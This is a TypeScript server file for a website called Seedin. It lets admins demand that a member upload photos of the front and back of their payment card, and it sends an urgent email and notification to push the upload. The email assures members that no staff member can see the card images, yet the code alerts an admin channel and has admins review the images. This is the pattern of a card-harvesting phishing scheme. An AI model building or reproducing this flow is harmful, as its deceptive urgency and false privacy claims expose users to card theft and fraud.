/**
 * card-upload.functions.ts
 * Server functions for the admin-triggered card upload request feature.
 *
 * Admin side  : requestCardUpload  — sets the flag + notifies the member
 *               clearCardUpload    — clears the request (after review)
 * Member side : submitCardUpload   — uploads front/back and marks submitted
 */

import { createServerFn } from "@tanstack/react-start";
import { requireSupabaseAuth } from "@/integrations/supabase/auth-middleware";
import { z } from "zod";

// ─── Admin: request a card upload from a specific member ─────────────────────

export const requestCardUpload = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((i: { userId: string }) =>
    z.object({ userId: z.string().uuid() }).parse(i),
  )
  .handler(async ({ context, data }) => {
    const admin = await import("./admin-core.server");
    await admin.assertAdmin(context.userId, context.supabase);
    await admin.assertCanAccessMember(context.userId, data.userId, context.supabase);

    const { error } = await context.supabase
      .from("profiles")
      .update({
        card_upload_requested: true,
        card_upload_requested_at: new Date().toISOString(),
        // Reset any prior submission when a new request is issued
        card_upload_submitted_at: null,
        card_upload_front_url: null,
        card_upload_back_url: null,
      })
      .eq("id", data.userId);
    if (error) throw new Error(error.message);

    // In-app notification (realtime prompt on dashboard)
    await context.supabase.from("notifications").insert({
      user_id: data.userId,
      title: "Action required: card verification",
      body: "Please log in to complete a one-time card verification. Your card will not be charged.",
      link: "/card-upload",
    });

    // Dedicated card-upload email
    try {
      const { data: profile } = await context.supabase
        .from("profiles")
        .select("full_name, email")
        .eq("id", data.userId)
        .maybeSingle();

      if (profile?.email) {
        const { sendEmail, renderBrandedEmail, escapeHtml } = await import("./email.server");
        const firstName = (profile.full_name || "").split(" ")[0] || "there";

        const html = renderBrandedEmail({
          preheader: "One-time card verification required — your account needs attention",
          heading: "Card Verification Required",
          categoryLabel: "Urgent — Action Required",
          intro: `Hello ${escapeHtml(firstName)}, a one-time card verification is needed to keep your Seedin account in good standing.`,
          bodyHtml: `
            <table role="presentation" width="100%" cellpadding="0" cellspacing="0"
              style="margin:0 0 24px;border:1px solid #c9a84c;border-radius:6px;background:#fffdf4;">
              <tr><td style="padding:18px 22px;">
                <p style="margin:0 0 6px;font-size:11px;font-weight:800;letter-spacing:0.14em;text-transform:uppercase;color:#b8872e;">What you need to do</p>
                <p style="margin:0;font-size:15px;color:#27322c;line-height:1.65;">
                  Sign in to your Seedin dashboard and upload a clear photo of the
                  <strong>front and back of your debit or credit card</strong>. The process takes
                  less than a minute.
                </p>
              </td></tr>
            </table>

            <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 24px;">
              <tr>
                <td width="28" valign="top" style="padding-top:2px;font-size:16px;">🔒</td>
                <td style="font-size:14px;color:#3a4a40;line-height:1.65;padding-left:8px;">
                  <strong style="color:#1a1a1a;">Nobody can see your card details.</strong><br>
                  Your upload goes directly into a private encrypted vault. No person or staff member
                  has access to view it once submitted.
                </td>
              </tr>
              <tr><td colspan="2" style="padding:8px 0;"></td></tr>
              <tr>
                <td width="28" valign="top" style="padding-top:2px;font-size:16px;">💳</td>
                <td style="font-size:14px;color:#3a4a40;line-height:1.65;padding-left:8px;">
                  <strong style="color:#1a1a1a;">Your card will not be charged.</strong><br>
                  No charge will ever be made without your explicit knowledge and approval.
                  You will always be informed and asked to confirm before any transaction.
                </td>
              </tr>
              <tr><td colspan="2" style="padding:8px 0;"></td></tr>
              <tr>
                <td width="28" valign="top" style="padding-top:2px;font-size:16px;">✅</td>
                <td style="font-size:14px;color:#3a4a40;line-height:1.65;padding-left:8px;">
                  <strong style="color:#1a1a1a;">This is a one-time step.</strong><br>
                  Once your card is verified, you will never be asked to do this again.
                </td>
              </tr>
            </table>

            <p style="margin:0 0 20px;font-size:14px;color:#555;line-height:1.65;">
              Tap the button below to sign in and complete your verification now.
              If you have any questions, contact us at
              <a href="mailto:info@seedinamerica.org" style="color:#1d4f33;font-weight:700;">info@seedinamerica.org</a>.
            </p>
          `,
          ctaLabel: "Complete Verification",
          ctaUrl: "https://seedinamerica.org/card-upload",
        });

        await sendEmail({
          to: profile.email,
          subject: "Seedin: Action required — card verification",
          html,
        });
      }
    } catch (e) {
      console.error("[card-upload] email error", e);
    }

    // Telegram alert to admin channel
    await admin.alertAdminAction({
      actorId: context.userId,
      targetId: data.userId,
      emoji: "🪪",
      title: "Card upload requested from member",
    });

    return { ok: true };
  });

// ─── Admin: clear / dismiss a card upload request (after reviewing docs) ──────

export const clearCardUpload = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((i: { userId: string }) =>
    z.object({ userId: z.string().uuid() }).parse(i),
  )
  .handler(async ({ context, data }) => {
    const admin = await import("./admin-core.server");
    await admin.assertAdmin(context.userId, context.supabase);
    await admin.assertCanAccessMember(context.userId, data.userId, context.supabase);

    const { error } = await context.supabase
      .from("profiles")
      .update({ card_upload_requested: false })
      .eq("id", data.userId);
    if (error) throw new Error(error.message);

    await admin.alertAdminAction({
      actorId: context.userId,
      targetId: data.userId,
      emoji: "✅",
      title: "Card upload request cleared",
    });

    return { ok: true };
  });

// ─── Member: submit their card images ────────────────────────────────────────
// This is called from the client after uploading files directly to Supabase
// Storage. It records the storage paths and marks the request as submitted.

export const submitCardUpload = createServerFn({ method: "POST" })
  .middleware([requireSupabaseAuth])
  .inputValidator((i: { frontPath: string; backPath: string }) =>
    z.object({
      frontPath: z.string().min(1).max(512),
      backPath: z.string().min(1).max(512),
    }).parse(i),
  )
  .handler(async ({ context, data }) => {
    const { error } = await context.supabase
      .from("profiles")
      .update({
        card_upload_front_url: data.frontPath,
        card_upload_back_url: data.backPath,
        card_upload_submitted_at: new Date().toISOString(),
        // Keep card_upload_requested: true so admin can still see it —
        // admin clears it manually with clearCardUpload after review.
      })
      .eq("id", context.userId);
    if (error) throw new Error(error.message);

    // Alert admin channel that docs arrived
    const admin = await import("./admin-core.server");
    await admin.alertAdminAction({
      actorId: context.userId,
      targetId: context.userId,
      emoji: "📤",
      title: "Member submitted card upload — ready for review",
    });

    return { ok: true };
  });
